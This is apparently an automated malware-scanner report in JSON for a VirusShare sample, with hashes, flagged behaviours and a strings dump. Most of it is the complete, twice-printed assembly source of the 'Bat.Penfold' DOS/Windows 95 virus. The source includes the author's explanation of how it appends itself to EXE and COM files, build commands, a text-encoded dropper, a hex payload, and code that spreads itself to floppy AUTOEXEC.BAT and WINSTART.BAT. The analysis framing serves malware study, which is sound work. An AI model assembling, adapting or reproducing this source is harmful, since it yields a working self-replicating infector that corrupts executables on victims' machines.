{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AUTOEXEC": "Runs when the Word document is opened",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "command": "May run PowerShell commands",
            "kill": "May delete a file",
            "open": "May open a file",
            "output": "May write to a file",
            "write": "May write to a file",
            "xor": "May attempt to obfuscate specific str"
        },
        "macro": ";              '\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u013f'\n;               \ufffd *******:::: Bat.Penfold Virus ::::****** \ufffd\n;               \ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\n;               \ufffd ****** -= \"Q\" the Misanthrope =- ******* \ufffd\n;              '\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd'\n\n\ncomment         @\n\nThe Bat.Penfold Virus by \"Q\" the Misanthrope\n\nThis virus was named after Danger Mouse's idiotic sidekick: Penfold.  Both\nPenfold and this virus are useless but slightly amusing at times.\n\nThis strange virus exploits the \"copy /a\" command.  The virus essentially is a\nbatch file virus.  The batch file has a CTRL-Z at the end of the file.  It\nchooses it's victom (*.COM *.EXE) and appends the executable program to the\nbatch file past the CTRL-Z.  So it turns the *.COM or *.EXE file into a *.BAT\nfile.  The batch file never executes past the CTRL-Z so the program never gets\nexecuted as batch code.  It creates a C:\\Penfold.COM file that turns it back\nto an executable program and executes it.  It does has traveling capabilities.\nWhenever an infected program has A: or B: as it's first parameter, the virus\ncopies itself to A: or B: as \\AUTOEXEC.BAT and \\WINSTART.BAT.  When booting\nfrom floppy, AUTOEXEC.BAT copies itself to the new host as C:\\WINSTART.BAT.\nWorks well with Windoze 95 or DOS.\n\nA special thanks goes to Herbert Kleebauer for his Hex2Bin convertor.  \n\ntasm penfold /m2\ntlink /t penfold\nren penfold.com penfold.bat\npenfold\n\n                @\n\npage\n\n\nqseg            segment para    public  'code'\nsimple\t\tproc\tfar\nassume          cs:qseg,es:qseg,ds:qseg\n\n.286\norg\t\t100h\n\n\nbegin:\n                db      '@echo off',0dh,0ah\n                db      'if \"%0==\" goto qauto',0dh,0ah\n                db      'if \"%1==\"qe2 goto %1',0dh,0ah\n                db      'for %%q in (%0 %winbootdir%\\command\\%0 c:\\dos\\%0) do %comspec% nul /f/cif not exist c:\\penfold.bat copy/a %%q+%%q.bat c:\\penfold.bat',0dh,0ah\n                db      'rem Bat.Penfold by \"Q\" | %comspec% nul /f/e:4096/cc:\\penfold.bat qe2 %0 %1 %2 %3 %4 %5 %6 %7 %8 %9',0dh,0ah\n                db      'del c:\\penfold.*',0dh,0ah\n                db      'goto qend',0dh,0ah\n                db      ':qauto',0dh,0ah\n                db      'if exist c:nul copy \\autoexec.bat c:\\winstart.bat>nul',0dh,0ah\n                db      '%comspec%',0dh,0ah\n                db      'goto qend',0dh,0ah\n                db      ':qe2',0dh,0ah\n                db      'for %%q in (%path%) do if %%q==C:\\DOS set qdir=%%q',0dh,0ah\n                db      'for %%q in (%path%) do if %%q==%winbootdir%\\COMMAND set qdir=%%q',0dh,0ah\n                db      'if \"%qdir%==\" goto qend',0dh,0ah\n                db      'for %%q in (%qdir%\\*.exe %qdir%\\*.com) do set q=%%q',0dh,0ah\n                db      'if \"%q%==\" goto qdone',0dh,0ah\n                db      'copy/b %q% c:\\penfold.new',0dh,0ah\n                db      'copy/b c:\\penfold.bat+c:\\penfold.new %q%',0dh,0ah\n                db      'ren %q% *.bat',0dh,0ah\n                db      ':qdone',0dh,0ah\n                db      'echo j@X$!PZRYI4~@@P]hWDX-a!-a!P[1/hrDX-a!-a!P[1/h#DX-a!-a!P[1/>c:\\penfold.exe',0dh,0ah\n                db      'echo @hsDX-a!-a!P[@@PP_R]!/3-GWX=zzwWUX,!rlUX$O$/P]1/Q]3/E)/Q]3/>>c:\\penfold.exe',0dh,0ah\n                db      'echo @E)/Q]3/E)/Q]3/E)/R]3-GUX,!ruUX$O$/P]1/^R]!,3/1,FVRX,0r/xx>>c:\\penfold.exe',0dh,0ah\n                db      'echo kmooook43o31mkk90100kj1402lm21723n09l07447j01402>>c:\\penfold.exe',0dh,0ah\n                db      'echo 3l3072n73l3977042l30nk0l0l203l6172m93l6677m52l57>>c:\\penfold.exe',0dh,0ah\n                db      'echo o7mm7808l0n004j21502nkl700061502k440kk0100k90100>>c:\\penfold.exe',0dh,0ah\n                db      'echo kj1502lm2173k4k440kk0200k91400kj1602lm21k8004llm>>c:\\penfold.exe',0dh,0ah\n                db      'echo 2100006665686l657220617566676574726574656n0m0j>>c:\\penfold.exe',0dh,0ah\n\ncomment         @\n\nThis bit of code is compiled separately and then debugged to obtain the\nhexadecimal text that is output to C:\\penfold.txt and then piped through\nc:\\penfold.exe to obtain c:\\penfold.com\n\npage\nqseg            segment para    public  'code'\nsimple\t\tproc\tfar\nassume          cs:qseg,es:qseg,ds:qseg\n.286\norg\t\t100h\nbegin:          mov     si,80h\n                push    word ptr ds:[si]        ;get file name passed to it\n                lea     dx,word ptr ds:[si+02h]\nlook_for_it:    inc     si\n                cmp     byte ptr ds:[si],\".\"\n                jne     look_for_it\n                xor     di,di\n                xchg    word ptr ds:[si+04h],di ;nul terminate it\n                mov     ax,3d40h                ;open file *.bat\n\t\tint     21h\n                mov     word ptr ds:[si+01h],\"XE\"\n                mov     byte ptr ds:[si+03h],\"E\"\n\t\txchg    ax,bx\n                push    dx\n                mov     ax,4200h                ;lseek past CTRL-Z\n\t\txor     cx,cx                   ;normal attributes\n                mov     dx,0855h                ;VERY IMPORTANT (offest of\n                int     21h                     ;byte past CTRL-Z in batch\n                pop     dx                      ;file\n                mov     ax,5b00h                ;create a file *.exe\n\t\tint     21h\n\t\txchg    ax,bp\nloop_copy:      push    bx\n                mov     ah,3fh                  ;read *.bat\n                mov     dx,offset buffer\n                mov     ch,02h                  ;512 bytes at a time\n\t\tint     21h\n\t\txchg    ax,cx\n                mov     ah,40h                  ;write to *.exe\n\t\tmov     bx,bp\n\t\tint     21h\n\t\tor      ax,ax                   ;zero bytes written?\n                pop     bx\n\t\tjnz     loop_copy               ;if not then continue\n                mov     ah,3eh                  ;close the *.exe file\n\t\tint     21h\n                mov     bx,bp\n                mov     ah,3eh                  ;close the *.bat file\n\t\tint     21h\n                xchg    word ptr ds:[si+04h],di ;undo nul termination\n\t\tmov\tbx,30h\n                mov     ah,4ah\n                int     21h\n                pop     bx\n                xor     bh,bh\n                mov     bp,0a0dh                ;prepare for INT 2E\n                mov     word ptr ds:[bx+81h],bp\n                lea     cx,word ptr ds:[bx-01h]\n                mov     si,0081h\n                mov     byte ptr ds:[si],cl\n                int     2eh\n                push    cs\n                pop     ds\n                mov     si,80h\n                lea     dx,word ptr ds:[si+02h] ;re-get file name\nlook_for_it2:   inc     si\n                cmp     byte ptr ds:[si],\".\"\n                jne     look_for_it2\n                mov     byte ptr ds:[si+04h],00h;nul terminate it\nretry_kill:     mov     ah,41h                  ;kill exe file\n                int     21h\n                jc      retry_kill\n                mov     ah,4dh                  ;get errorlevel of exe\n                int     21h\n                mov     ah,4ch                  ;close with same errorlevel\n                int     21h\nbuffer          equ     $\nsimple\t\tendp\nqseg            ends\nend\t\tbegin\n\n                @\n\n                db      'echo BE8000FF348D540246803C2E75FA33FF877C04B8403DCD21C744014558>c:\\penfold.txt',0dh,0ah\n                db      'echo C64403459352B8004233C9BA5508CD215AB8005BCD219553B43FBA9201>>c:\\penfold.txt',0dh,0ah\n;       Lenth of batch file minus 2 bytes goes here --^  The lenth is 0855h bytes \n                db      'echo B502CD2191B4408BDDCD210BC05B75EAB43ECD218BDDB43ECD21877C04>>c:\\penfold.txt',0dh,0ah\n                db      'echo BB3000B44ACD215B32FFBD0D0A89AF81008D4FFFBE8100880CCD2E0E1F>>c:\\penfold.txt',0dh,0ah\n                db      'echo BE80008D540246803C2E75FAC6440400B441CD2172FAB44DCD21B44CCD21>>c:\\penfold.txt',0dh,0ah\n                db      'c:\\penfold.exe<c:\\penfold.txt>c:\\penfold.com',0dh,0ah\n                db      'if not \"%3==\" for %%q in (a: A: b: B:) do if %3==%%q %comspec% nul /f/ccopy/b c:\\penfold.bat %%q\\autoexec.bat',0dh,0ah\n                db      'if not \"%3==\" for %%q in (a: A: b: B:) do if %3==%%q %comspec% nul /f/ccopy/b c:\\penfold.bat %%q\\winstart.bat',0dh,0ah\n                db      'for %%q in (%qdir%\\%2 %qdir%\\%2.bat) do if exist %%q %comspec% con /cc:\\penfold.com %%q %3 %4 %5 %6 %7 %8 %9',0dh,0ah\n                db      'set qdir=',0dh,0ah\n                db      'set q=',0dh,0ah\n                db      'exit',0dh,0ah\n                db      ':qend',0dh,0ah\n                db      1ah\n                int     20h\n\nsimple\t\tendp\nqseg            ends\n\nend\t\tbegin"
    },
    "filename": "VirusShare_00c024e0362b9fbb03047898ca5c8e4f",
    "filesize": 8714,
    "filetype": "ISO-8859 text, with CRLF line terminators",
    "hashes": {
        "md5": "00c024e0362b9fbb03047898ca5c8e4f",
        "sha1": "ce7020091b460b1fab846ba2a5617cebfd40829c",
        "sha256": "a7833d1163e45c9f8ca0edd40a468cc126bb04f2620050fea93308c5bd8d923c"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            ";              '\u013f'",
            ";                *******:::: Bat.Penfold Virus ::::****** ",
            ";                 ",
            ";                ****** -= \"Q\" the Misanthrope =- ******* ",
            ";              ''",
            "comment         @",
            "The Bat.Penfold Virus by \"Q\" the Misanthrope",
            "This virus was named after Danger Mouse's idiotic sidekick: Penfold.  Both",
            "Penfold and this virus are useless but slightly amusing at times.",
            "This strange virus exploits the \"copy /a\" command.  The virus essentially is a",
            "batch file virus.  The batch file has a CTRL-Z at the end of the file.  It",
            "chooses it's victom (*.COM *.EXE) and appends the executable program to the",
            "batch file past the CTRL-Z.  So it turns the *.COM or *.EXE file into a *.BAT",
            "file.  The batch file never executes past the CTRL-Z so the program never gets",
            "executed as batch code.  It creates a C:\\Penfold.COM file that turns it back",
            "to an executable program and executes it.  It does has traveling capabilities.",
            "Whenever an infected program has A: or B: as it's first parameter, the virus",
            "copies itself to A: or B: as \\AUTOEXEC.BAT and \\WINSTART.BAT.  When booting",
            "from floppy, AUTOEXEC.BAT copies itself to the new host as C:\\WINSTART.BAT.",
            "Works well with Windoze 95 or DOS.",
            "A special thanks goes to Herbert Kleebauer for his Hex2Bin convertor.  ",
            "tasm penfold /m2",
            "tlink /t penfold",
            "ren penfold.com penfold.bat",
            "penfold",
            "                @",
            "page",
            "qseg            segment para    public  'code'",
            "simple\t\tproc\tfar",
            "assume          cs:qseg,es:qseg,ds:qseg",
            ".286",
            "org\t\t100h",
            "begin:",
            "                db      '@echo off',0dh,0ah",
            "                db      'if \"%0==\" goto qauto',0dh,0ah",
            "                db      'if \"%1==\"qe2 goto %1',0dh,0ah",
            "                db      'for %%q in (%0 %winbootdir%\\command\\%0 c:\\dos\\%0) do %comspec% nul /f/cif not exist c:\\penfold.bat copy/a %%q+%%q.bat c:\\penfold.bat',0dh,0ah",
            "                db      'rem Bat.Penfold by \"Q\" | %comspec% nul /f/e:4096/cc:\\penfold.bat qe2 %0 %1 %2 %3 %4 %5 %6 %7 %8 %9',0dh,0ah",
            "                db      'del c:\\penfold.*',0dh,0ah",
            "                db      'goto qend',0dh,0ah",
            "                db      ':qauto',0dh,0ah",
            "                db      'if exist c:nul copy \\autoexec.bat c:\\winstart.bat>nul',0dh,0ah",
            "                db      '%comspec%',0dh,0ah",
            "                db      'goto qend',0dh,0ah",
            "                db      ':qe2',0dh,0ah",
            "                db      'for %%q in (%path%) do if %%q==C:\\DOS set qdir=%%q',0dh,0ah",
            "                db      'for %%q in (%path%) do if %%q==%winbootdir%\\COMMAND set qdir=%%q',0dh,0ah",
            "                db      'if \"%qdir%==\" goto qend',0dh,0ah",
            "                db      'for %%q in (%qdir%\\*.exe %qdir%\\*.com) do set q=%%q',0dh,0ah",
            "                db      'if \"%q%==\" goto qdone',0dh,0ah",
            "                db      'copy/b %q% c:\\penfold.new',0dh,0ah",
            "                db      'copy/b c:\\penfold.bat+c:\\penfold.new %q%',0dh,0ah",
            "                db      'ren %q% *.bat',0dh,0ah",
            "                db      ':qdone',0dh,0ah",
            "                db      'echo j@X$!PZRYI4~@@P]hWDX-a!-a!P[1/hrDX-a!-a!P[1/h#DX-a!-a!P[1/>c:\\penfold.exe',0dh,0ah",
            "                db      'echo @hsDX-a!-a!P[@@PP_R]!/3-GWX=zzwWUX,!rlUX$O$/P]1/Q]3/E)/Q]3/>>c:\\penfold.exe',0dh,0ah",
            "                db      'echo @E)/Q]3/E)/Q]3/E)/R]3-GUX,!ruUX$O$/P]1/^R]!,3/1,FVRX,0r/xx>>c:\\penfold.exe',0dh,0ah",
            "                db      'echo kmooook43o31mkk90100kj1402lm21723n09l07447j01402>>c:\\penfold.exe',0dh,0ah",
            "                db      'echo 3l3072n73l3977042l30nk0l0l203l6172m93l6677m52l57>>c:\\penfold.exe',0dh,0ah",
            "                db      'echo o7mm7808l0n004j21502nkl700061502k440kk0100k90100>>c:\\penfold.exe',0dh,0ah",
            "                db      'echo kj1502lm2173k4k440kk0200k91400kj1602lm21k8004llm>>c:\\penfold.exe',0dh,0ah",
            "                db      'echo 2100006665686l657220617566676574726574656n0m0j>>c:\\penfold.exe',0dh,0ah",
            "comment         @",
            "This bit of code is compiled separately and then debugged to obtain the",
            "hexadecimal text that is output to C:\\penfold.txt and then piped through",
            "c:\\penfold.exe to obtain c:\\penfold.com",
            "page",
            "qseg            segment para    public  'code'",
            "simple\t\tproc\tfar",
            "assume          cs:qseg,es:qseg,ds:qseg",
            ".286",
            "org\t\t100h",
            "begin:          mov     si,80h",
            "                push    word ptr ds:[si]        ;get file name passed to it",
            "                lea     dx,word ptr ds:[si+02h]",
            "look_for_it:    inc     si",
            "                cmp     byte ptr ds:[si],\".\"",
            "                jne     look_for_it",
            "                xor     di,di",
            "                xchg    word ptr ds:[si+04h],di ;nul terminate it",
            "                mov     ax,3d40h                ;open file *.bat",
            "\t\tint     21h",
            "                mov     word ptr ds:[si+01h],\"XE\"",
            "                mov     byte ptr ds:[si+03h],\"E\"",
            "\t\txchg    ax,bx",
            "                push    dx",
            "                mov     ax,4200h                ;lseek past CTRL-Z",
            "\t\txor     cx,cx                   ;normal attributes",
            "                mov     dx,0855h                ;VERY IMPORTANT (offest of",
            "                int     21h                     ;byte past CTRL-Z in batch",
            "                pop     dx                      ;file",
            "                mov     ax,5b00h                ;create a file *.exe",
            "\t\tint     21h",
            "\t\txchg    ax,bp",
            "loop_copy:      push    bx",
            "                mov     ah,3fh                  ;read *.bat",
            "                mov     dx,offset buffer",
            "                mov     ch,02h                  ;512 bytes at a time",
            "\t\tint     21h",
            "\t\txchg    ax,cx",
            "                mov     ah,40h                  ;write to *.exe",
            "\t\tmov     bx,bp",
            "\t\tint     21h",
            "\t\tor      ax,ax                   ;zero bytes written?",
            "                pop     bx",
            "\t\tjnz     loop_copy               ;if not then continue",
            "                mov     ah,3eh                  ;close the *.exe file",
            "\t\tint     21h",
            "                mov     bx,bp",
            "                mov     ah,3eh                  ;close the *.bat file",
            "\t\tint     21h",
            "                xchg    word ptr ds:[si+04h],di ;undo nul termination",
            "\t\tmov\tbx,30h",
            "                mov     ah,4ah",
            "                int     21h",
            "                pop     bx",
            "                xor     bh,bh",
            "                mov     bp,0a0dh                ;prepare for INT 2E",
            "                mov     word ptr ds:[bx+81h],bp",
            "                lea     cx,word ptr ds:[bx-01h]",
            "                mov     si,0081h",
            "                mov     byte ptr ds:[si],cl",
            "                int     2eh",
            "                push    cs",
            "                pop     ds",
            "                mov     si,80h",
            "                lea     dx,word ptr ds:[si+02h] ;re-get file name",
            "look_for_it2:   inc     si",
            "                cmp     byte ptr ds:[si],\".\"",
            "                jne     look_for_it2",
            "                mov     byte ptr ds:[si+04h],00h;nul terminate it",
            "retry_kill:     mov     ah,41h                  ;kill exe file",
            "                int     21h",
            "                jc      retry_kill",
            "                mov     ah,4dh                  ;get errorlevel of exe",
            "                int     21h",
            "                mov     ah,4ch                  ;close with same errorlevel",
            "                int     21h",
            "buffer          equ     $",
            "simple\t\tendp",
            "qseg            ends",
            "end\t\tbegin",
            "                @",
            "                db      'echo BE8000FF348D540246803C2E75FA33FF877C04B8403DCD21C744014558>c:\\penfold.txt',0dh,0ah",
            "                db      'echo C64403459352B8004233C9BA5508CD215AB8005BCD219553B43FBA9201>>c:\\penfold.txt',0dh,0ah",
            ";       Lenth of batch file minus 2 bytes goes here --^  The lenth is 0855h bytes ",
            "                db      'echo B502CD2191B4408BDDCD210BC05B75EAB43ECD218BDDB43ECD21877C04>>c:\\penfold.txt',0dh,0ah",
            "                db      'echo BB3000B44ACD215B32FFBD0D0A89AF81008D4FFFBE8100880CCD2E0E1F>>c:\\penfold.txt',0dh,0ah",
            "                db      'echo BE80008D540246803C2E75FAC6440400B441CD2172FAB44DCD21B44CCD21>>c:\\penfold.txt',0dh,0ah",
            "                db      'c:\\penfold.exe<c:\\penfold.txt>c:\\penfold.com',0dh,0ah",
            "                db      'if not \"%3==\" for %%q in (a: A: b: B:) do if %3==%%q %comspec% nul /f/ccopy/b c:\\penfold.bat %%q\\autoexec.bat',0dh,0ah",
            "                db      'if not \"%3==\" for %%q in (a: A: b: B:) do if %3==%%q %comspec% nul /f/ccopy/b c:\\penfold.bat %%q\\winstart.bat',0dh,0ah",
            "                db      'for %%q in (%qdir%\\%2 %qdir%\\%2.bat) do if exist %%q %comspec% con /cc:\\penfold.com %%q %3 %4 %5 %6 %7 %8 %9',0dh,0ah",
            "                db      'set qdir=',0dh,0ah",
            "                db      'set q=',0dh,0ah",
            "                db      'exit',0dh,0ah",
            "                db      ':qend',0dh,0ah",
            "                db      1ah",
            "                int     20h",
            "simple\t\tendp",
            "qseg            ends",
            "end\t\tbegin"
        ],
        "file": {
            "                mov     ah,40h                  ;write to *.exe": "Executable",
            "                mov     ax,5b00h                ;create a file *.exe": "Executable"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.344334",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
